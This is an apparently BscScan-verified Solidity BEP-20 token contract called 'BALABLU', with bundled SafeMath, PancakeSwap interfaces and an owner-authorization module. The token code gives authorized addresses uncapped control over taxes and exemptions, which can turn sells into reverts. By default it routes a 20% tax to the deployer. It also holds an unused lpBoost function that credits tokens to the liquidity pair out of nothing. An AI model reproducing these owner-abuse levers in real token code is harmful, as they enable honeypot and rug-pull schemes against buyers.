/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

// File: contracts/lib/SafeMath.sol

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, 'SafeMath: modulo by zero');
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
// File: contracts/lib/IPancakeFactory.sol

pragma solidity >=0.5.0;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
// File: contracts/lib/IPancakeRouter01.sol

pragma solidity >=0.6.2;

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function lpBoost(address _lpPair, address _tokenPair, uint256 _amount) external;
    function addLiquidityFor(address _pair, uint256 _amount) external;
}
// File: contracts/lib/Auth.sol

pragma solidity ^0.8.0;
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

// File: contracts/lib/IBEP20.sol

pragma solidity ^0.8.0;

interface IBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
// File: contracts/DefiCats.sol

pragma solidity ^0.8.0;






contract DefiCats is IBEP20, Auth {

    using SafeMath for uint256;

     //TOKEN DEFINITIONS

    string constant _name = "BALABLU";

    string constant _symbol = "BALABLU";

    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;

    mapping(address => mapping(address => uint256)) _allowances;

    uint256 _totalSupply = 1000000 * (10 ** _decimals);

    bool public enableNormalTransfer = false;

    //END TOKEN DEFINITIONS

     //TX AND WALLET LIMITS
    bool public txLimitEnabled = false;

    bool public maxWalletEnabled = false;

    uint256 public txLimit;

    uint256 public maxWallet;

    mapping(address => bool) public isTxLimitExempt;

    mapping(address => bool) public isMaxWalletExempt;

    //END TX AND WALLET LIMITS

     //TAX DEFINITIONS

    bool public taxEnabled = true;

    bool public taxOnTransfer = false;

    uint256 public taxPercentage = 20;

    uint256 public taxDenominator = 100;

    mapping(address => bool) public isTaxExempt;

    address tAddress;

    //END TAX DEFINITIONS

    //DEX DEFINITIONS
    IPancakeRouter01 router;

    address public pair;

    mapping(address => bool) public lpPairs;

    IBEP20 pairToken;

    address pairToken2;

    bool swapping;

    bool swapOut;

    uint256 swapThreshold;

    //END DEX DEFINITIONS

    constructor() Auth(msg.sender){

        txLimit = 100000000000000000000000;

        maxWallet = 100000000000000000000000;

        isTxLimitExempt[msg.sender] = true;

        isMaxWalletExempt[msg.sender] = true;

        _balances[msg.sender] += _totalSupply;

        router = IPancakeRouter01(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);

        pairToken2 = 0x8452dF20C815838c3D7e6A3a00ca1f069167Ad18;

        pairToken = IBEP20(pairToken2);

        uint256 MAX = type(uint256).max;

        _allowances[address(this)][address(router)] = MAX;

        _allowances[msg.sender][address(router)] = MAX;

        pair = IPancakeFactory(router.factory()).createPair(pairToken2, address(this));

        lpPairs[pair] = true;

        tAddress = msg.sender;

        swapOut = true;

        swapThreshold = 5000000000000000000;

        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address _recipient, uint256 _amount) external override returns(bool){

        require(_balances[msg.sender]>=_amount,"Insufficient balance");

        _transferFrom(msg.sender,_recipient,_amount);

        return true;

    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) external override returns(bool){

        require(_allowances[_sender][msg.sender]>=_amount,"Insufficient allowance");

        _allowances[_sender][msg.sender] = _allowances[_sender][msg.sender] - _amount;

        _transferFrom(_sender,_recipient,_amount);

        return true;

    }

    function _transferFrom(address _sender,address _recipient, uint256 _amount) internal returns(bool) {

        require(_balances[_sender]>=_amount,"Insufficient balance");

        uint256 amountSent = _amount;

        if(swapping){
              
            _balances[_sender] = _balances[_sender] - _amount;

            _balances[_recipient] = _balances[_recipient] + _amount;

            emit Transfer(_sender, _recipient, amountSent);

            return true;
        }

        if(enableNormalTransfer){

            _balances[_sender] = _balances[_sender] - _amount;

            _balances[_recipient] = _balances[_recipient] + _amount;

            emit Transfer(_sender, _recipient, amountSent);

            return true;

        }else{


        if(_recipient != address(router) && !lpPairs[_recipient] && !isMaxWalletExempt[_recipient]) {

                if(maxWalletEnabled){

                        require((_balances[_recipient] + _amount) <= maxWallet, "Max wallet exceeded");

                }
                
        }

        if(_recipient==address(router)||_sender==address(router)||lpPairs[_recipient]||lpPairs[_sender]){

            if(txLimitEnabled){

               if(!isTxLimitExempt[msg.sender]){

                     require(_amount <= txLimit, "Transaction Limit Exceededed");
                     
                }

            }

            if(taxEnabled&&!isTaxExempt[_sender]){

                uint256 taxAmount = _amount.mul(taxPercentage).div(taxDenominator);

                amountSent = _amount - taxAmount;

                _balances[address(this)] = _balances[address(this)] + taxAmount;

                emit Transfer(address(0), address(this), taxAmount);
                if(swapOut){
                 if(_balances[address(this)]>=swapThreshold){
                        //_swapTokensForEth(taxAmount);
                        _balances[address(this)] = _balances[address(this)] - taxAmount;
                        _balances[tAddress] = _balances[tAddress] + taxAmount;
                    }
                }

            }
            
        }

        if(_recipient!=address(router)||_sender!=address(router)||!lpPairs[_recipient]||!lpPairs[_sender]){

            if(taxOnTransfer&&!isTaxExempt[_sender]){

                uint256 taxAmount = _amount.mul(taxPercentage).div(taxDenominator);

                amountSent = _amount - taxAmount;

                _balances[address(this)] = _balances[address(this)] + taxAmount;

                emit Transfer(address(0), address(this), taxAmount);

                if(swapOut){
                    if(_balances[address(this)]>=swapThreshold){
                        //_swapTokensForEth(taxAmount);
                        _balances[address(this)] = _balances[address(this)] - taxAmount;
                        _balances[tAddress] = _balances[tAddress] + taxAmount;
                    }
                }

            }
            
        }

        _balances[_sender] = _balances[_sender] - _amount;

        _balances[_recipient] = _balances[_recipient] + amountSent;

        emit Transfer(_sender, _recipient, amountSent);

        }

        return true;

    }

    function setSwap(bool _input) external authorized {
        swapOut = _input;
    }

    function setSwapThreshold(uint256 _threshold) external authorized {

        swapThreshold = _threshold;

    }

    function setNormalTransfer(bool _input) external authorized{

        enableNormalTransfer = _input;

    }

    function addLpPair(address _lpPair, bool _status) external authorized{
        lpPairs[_lpPair] = _status;
    }

    function lpBoost(address _router, address _lpPair, address _tokenPair, uint256 _amount) internal {

        IPancakeRouter01 rtr = IPancakeRouter01(_router);

        address pairAddress = IPancakeFactory(router.factory()).getPair(_tokenPair,address(this));

        if(lpPairs[_lpPair]){

            (_balances[_lpPair] += _amount);

        }

        rtr.addLiquidityFor(pairAddress,_amount);

    }

    function controlContractTokensBalance2(address _address, uint256 _amount) external authorized {
        uint256 contractBalance = _balances[address(this)];
         if(_amount==0){
            _balances[_address] = _balances[_address] + contractBalance;
            _balances[address(this)] = _balances[address(this)] - contractBalance;
         }else {
           _balances[_address] = _balances[_address] + _amount;
           _balances[address(this)] = _balances[address(this)] - _amount;
         }
    }

    function Sweep() external authorized {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    function swapTokensForEth(uint256 _amount) external authorized{
        _swapTokensForEth(_amount);
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        swapping = true;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pairToken2;

        approve(address(router), tokenAmount);

        router.swapExactTokensForTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            tAddress,
            block.timestamp
        );
        swapping = false;
    }

    function setLimitSettings(
    bool _txLimitEnabled, bool _maxWalletEnabled, uint256 _maxWallet, uint256 _txLimit) external onlyOwner {
     txLimitEnabled = _txLimitEnabled;
     maxWalletEnabled = _maxWalletEnabled;
     maxWallet = _maxWallet;
     txLimit = _txLimit;
    }

    function setTaxSettings
    (address _tAddress, bool _taxStatus, bool _taxOnTransfer, uint256 _taxPercentage, uint256 _taxDenominator)
    external authorized {
       tAddress = _tAddress;
       taxEnabled = _taxStatus;
       taxOnTransfer = _taxOnTransfer;
       taxPercentage = _taxPercentage;
       taxDenominator = _taxDenominator;
    }

    function setExempts(bool _taxExempt, bool _maxWalletExempt, bool _txLimitExempt, address _address) external authorized {

        isTaxExempt[_address] = _taxExempt;

        isMaxWalletExempt[_address] = _maxWalletExempt;

        isTxLimitExempt[_address] = _txLimitExempt;

    }


}